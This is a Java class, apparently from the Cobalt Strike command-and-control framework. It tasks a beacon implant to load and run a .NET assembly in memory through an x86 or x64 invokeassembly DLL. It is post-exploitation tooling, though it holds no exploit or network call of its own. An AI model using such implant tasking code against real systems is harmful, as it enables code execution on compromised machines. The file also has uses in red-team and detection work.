package beacon.jobs;

import beacon.JobSimple;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;

import java.io.File;

public class ExecuteAssemblyJob
        extends JobSimple {
    protected String file;
    protected String args;
    protected String arch;

    public ExecuteAssemblyJob(TaskBeacon tasker, String file, String args, String arch) {
        super(tasker);
        this.file = file;
        this.args = args;
        this.arch = arch;
    }

    @Override
    public String getDescription() {
        if (this.args.length() > 0) {
            return "Tasked beacon to run .NET program: " + new File(this.file).getName() + " " + this.args;
        }
        return "Tasked beacon to run .NET program: " + new File(this.file).getName();
    }

    @Override
    public String getShortDescription() {
        return ".NET assembly";
    }

    @Override
    public String getDLLName() {
        if (this.arch.equals("x86")) {
            return "resources/invokeassembly.dll";
        }
        return "resources/invokeassembly.x64.dll";
    }

    @Override
    public int getWaitTime() {
        return 20000;
    }

    @Override
    public byte[] getArgument() {
        byte[] myfile = CommonUtils.readFile(this.file);
        Packer packer = new Packer();
        packer.addInt(myfile.length);
        packer.append(myfile);
        packer.addWideString(this.args + '\u0000');
        return packer.getBytes();
    }
}

